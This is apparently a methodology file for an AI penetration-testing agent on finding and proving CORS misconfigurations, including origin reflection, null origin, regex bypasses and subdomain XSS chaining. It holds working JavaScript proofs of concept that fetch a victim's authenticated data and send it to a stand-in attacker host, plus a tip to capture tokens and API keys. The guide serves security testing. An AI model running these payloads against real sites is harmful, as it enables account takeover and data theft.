---
name: cors_misconfiguration
description: CORS misconfiguration testing covering origin reflection, null origin, trusted subdomain chains, regex bypass, and credential theft PoC
---

# CORS Misconfiguration

Cross-Origin Resource Sharing (CORS) misconfigurations allow malicious websites to make authenticated cross-origin requests and read the responses. When combined with `Access-Control-Allow-Credentials: true`, this is account takeover from any internet page. The impact is high, and the vulnerability is widespread — many APIs reflect the `Origin` header without validation.

## Attack Surface

**High-Value Targets**
- APIs with `Access-Control-Allow-Credentials: true` on any endpoint
- Authentication endpoints returning tokens or session data
- User data endpoints (profile, payment info, private messages)
- Admin APIs that trust internal origin patterns
- Single-page application backends with permissive CORS policies

**Where to Look**
- All endpoints that return `Access-Control-Allow-Origin` header
- Endpoints that DON'T return CORS headers but have session-authenticated data (pre-flight bypass via simple requests)
- WebSocket upgrade endpoints (CORS-equivalent: `Origin` header check)

## Detection

**Step 1: Origin Reflection Test**
Send a request with a custom `Origin` header and check if it is reflected verbatim:
```
GET /api/user HTTP/1.1
Origin: https://evil.attacker.com

Response:
Access-Control-Allow-Origin: https://evil.attacker.com   ← REFLECTED = VULNERABLE
Access-Control-Allow-Credentials: true                   ← credentials included = critical
```

**Step 2: Null Origin Test**
```
Origin: null
→ Access-Control-Allow-Origin: null   ← vulnerable to sandbox/data-URI attacks
```

**Step 3: Subdomain Test**
```
Origin: https://evil.victim.com       ← test if any subdomain is trusted
Origin: https://victim.com.evil.com   ← test suffix matching bugs
Origin: https://notevil.victim.com    ← test prefix matching bugs
```

**Step 4: Protocol Variation**
```
Origin: http://victim.com             ← HTTP vs HTTPS
Origin: https://victim.com:8443       ← port variation
```

## Key Vulnerabilities

### Origin Reflection with Credentials

The server reflects any `Origin` value and includes credentials:
```http
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```
**Impact**: Any website can make authenticated requests on behalf of the victim and read the response. Full account takeover.

**PoC (run via browser `execute_js` action):**
```javascript
fetch('https://target.com/api/user', {
  credentials: 'include',
  method: 'GET'
})
.then(r => r.text())
.then(d => fetch('https://attacker.com/steal?d=' + encodeURIComponent(d)))
```

### Null Origin

`Origin: null` is sent by:
- Sandboxed iframes: `<iframe sandbox="allow-scripts" src="data:text/html,..."></iframe>`
- `file://` protocol pages
- Cross-origin redirects

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
fetch('https://target.com/api/user', {credentials: 'include'})
.then(r=>r.text()).then(d=>top.location='https://attacker.com/?d='+btoa(d))
</script>">
```

### Regex Bypass

Servers often use regex to validate origins. Common mistakes:
```
Pattern: /victim\.com$/          → Bypass: https://evilcvictim.com (no dot escape)
Pattern: /^https:\/\/victim/     → Bypass: https://victimevil.com  (suffix not anchored)
Pattern: /victim\.com/           → Bypass: https://evil.victim.com.attacker.com
Pattern: subdomain\.victim\.com  → Bypass: https://evilsubdomain.victim.com (prefix match)
```

### Trusted Subdomain + XSS Chain

If `https://sub.victim.com` is in the CORS allowlist AND has an XSS vulnerability:
1. Exploit XSS on `sub.victim.com`
2. Use it to make a cross-origin request to `api.victim.com` with credentials
3. Read the response (same-origin from the trusted subdomain's perspective)
4. Exfiltrate the data

This escalates a low-severity reflected XSS on a subdomain to full account takeover on the main app.

### Pre-flight Bypass (Simple Requests)

Simple requests (GET, POST with `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`) do NOT trigger a pre-flight OPTIONS request. CORS enforcement only applies to the pre-flight — the actual request is sent regardless.

Servers that rely on `OPTIONS` pre-flight rejection to block cross-origin access are vulnerable when the endpoint accepts simple request methods.

### Vary Header Missing

If `Vary: Origin` is absent from the response, CDN caches may serve the same CORS response to all origins, leaking or poisoning the policy.

## Bypass Techniques

**Dot as Wildcard**
```
Origin: https://evilXvictim.com     ← if pattern is victim.com without anchoring
```

**Port Variation**
```
Origin: https://victim.com:8080
Origin: http://victim.com           ← HTTP downgrade
```

**Subdomain Enumeration for Chaining**
Use `subfinder` and `httpx` to enumerate all subdomains and check each for XSS if CORS trusts `*.victim.com`.

## Tools

- **Caido** — Observe `Access-Control-Allow-Origin` in all responses; add `Origin: https://evil.com` header and replay requests
- **Browser `execute_js` action** — Run actual cross-origin fetch PoC to prove exploitability with real session cookies
- **nuclei** — CORS templates: `nuclei -t nuclei-templates/vulnerabilities/cors/`
- **Python aiohttp** — Automated origin fuzzing across all discovered endpoints

## Testing Methodology

1. Scan all API responses for `Access-Control-Allow-Origin` headers using Caido proxy history
2. For each endpoint returning `Access-Control-Allow-Credentials: true`: test origin reflection, null origin, subdomain trust
3. For endpoints without explicit CORS headers: test if simple-method requests succeed cross-origin (no pre-flight)
4. Map all trusted origins from regex patterns in server-side code (if white-box access available)
5. Test regex edge cases: suffix matching, dot-as-wildcard, port variation, protocol variation
6. Enumerate subdomains trusted by CORS policy; test each for XSS for chaining
7. Prove exploitability: use browser `execute_js` action to run actual `fetch` with `credentials: 'include'` from a malicious page context
8. Document: which endpoints are affected, what data is accessible, full PoC

## Pro Tips

- Always check for `Access-Control-Allow-Credentials: true` separately — `ACAO: *` without credentials is low severity; with credentials it's critical
- The most common pattern is: ACAO reflects Origin header, credentials true, on `/api/user` or `/api/profile` — this is account takeover
- Test the pre-flight: send `OPTIONS` request first, then send the actual `GET/POST`. Some servers check credentials only on OPTIONS but not the real request
- Subdomain takeover + CORS trust = automatic critical finding: a dangling subdomain in the CORS allowlist is directly exploitable
- When running the PoC via `execute_js`, capture the full response body including auth tokens, API keys, and personal data to demonstrate real impact
